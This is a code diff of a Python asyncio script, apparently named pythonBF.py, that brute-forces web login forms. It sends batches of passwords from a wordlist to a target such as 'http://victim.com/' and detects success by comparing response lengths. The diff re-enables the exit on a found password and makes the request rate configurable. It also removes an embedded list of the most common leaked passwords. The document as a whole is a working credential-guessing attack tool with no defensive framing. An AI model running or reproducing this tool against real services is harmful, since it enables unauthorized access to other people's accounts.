@@ -2,6 +2,7 @@ import time
 import aiohttp
 import asyncio
 import sys
+import os
 
 
 async def wrg_pass(session):
@@ -13,7 +14,7 @@ async def wrg_pass(session):
         login_data[f'{sys.argv[4]}'] = sys.argv[2]
         # return len(str(resp))
     async with session.post(url, data=login_data) as resp:
-        print("Wrong pass request", len(str(resp)))
+        print("Wrong pass request,(with response that include bad password message)", len(str(resp)))
         # login_data[f'{sys.argv[4]}'] = sys.argv[2]
         return len(str(resp))
 
@@ -24,38 +25,38 @@ async def send_request(session, password, __wrg_pass):
     async with session.post(url, data=login_data) as resp:
         print(f"Request send to {url}, login: {login_data[f'{sys.argv[4]}']},"
               f" password: {password}. Response length: {len(str(resp))}")
-        # if len(str(resp)) != __wrg_pass:
-            # sys.exit(f"Found one, {login_data[f'{sys.argv[4]}']} {password}")
+        if len(str(resp)) != __wrg_pass:
+            sys.exit(f"Found one, {login_data[f'{sys.argv[4]}']} {password}")
 
 
 async def period(session, point, __wrg_pass):
-    print("START OF PERIOD")
+    print(f"Sending {default_request_per_period} requests")
     tasks = []
     temp_pass = []
     pointer = open(f"{path_to_wordlist}")
-    m = 0
+    m = 1
 
     for i in pointer:
         m += 1
-        if point <= m and m < (point + 50):
+        if point <= m and m < (point + default_request_per_period):
             temp_pass.append(i)
-        elif m == (point + 50):
+        elif m == (point + default_request_per_period):
             break
     for i in temp_pass:
         tasks.append(asyncio.ensure_future(send_request(session, i.rstrip(), __wrg_pass)))
     await asyncio.gather(*tasks)
-    print("END OF PERIOD")
+
 
 
 async def main():
     async with aiohttp.ClientSession() as session:
         _wrg_pass = await wrg_pass(session)
-        for _ in range(30):
-            await period(session, _ * 50, _wrg_pass)
+        for _ in range(50):
+            await period(session, _ * default_request_per_period, _wrg_pass)
 
 
 if __name__ == "__main__":
-    if len(sys.argv) == 6:
+    if len(sys.argv) >= 6:
         try:
             args = sys.argv
             login_data = {}
@@ -63,6 +64,9 @@ if __name__ == "__main__":
             login_data[f'{sys.argv[4]}'] = sys.argv[2]
             login_data[f'{sys.argv[5]}'] = "pwd_field"
             path_to_wordlist = f"{sys.argv[3]}"
+            default_request_per_period = 24
+            if len(sys.argv) == 7:
+                default_request_per_period = int(sys.argv[6])
 
             start_time = time.perf_counter()
             asyncio.run(main())
@@ -70,60 +74,11 @@ if __name__ == "__main__":
 
         except:
             e = sys.exc_info()
-            print(e[0])
-            print(e[1])
+            print("===\n",e[0])
+            print(e[1], "\n===\n")
+            print("|-> Error, something went wrong, check if server is up and nothing is blocking you connection!"
+                  "\n|-> Also check if data that you paste is correct!")
 
-            print("Error, something went wrong, check if server is up and nothing is blocking you connection!")
     else:
-        print("Usage: python3 pythonBF.py 'http://victim.com/' 'username' "
+        print(f"Usage: python3 {os.path.basename(__file__)} 'http://victim.com/' 'username' "
               "'/path/to/wordlist.txt' 'username field name' 'password field name'")
-
-
-"""123456
-12345
-123456789
-password
-iloveyou
-princess
-1234567
-rockyou
-12345678
-abc123
-nicole
-daniel
-babygirl
-monkey
-lovely
-jessica
-654321
-michael
-ashley
-qwerty
-111111
-iloveu
-000000
-michelle
-tigger
-sunshine
-chocolate
-password1
-soccer
-anthony
-friends
-butterfly
-purple
-angel
-jordan
-liverpool
-justin
-loveme
-fuckyou
-123123
-football
-secret
-andrea
-carlos
-jennifer
-joshua
-bubbles
-1234567890"""
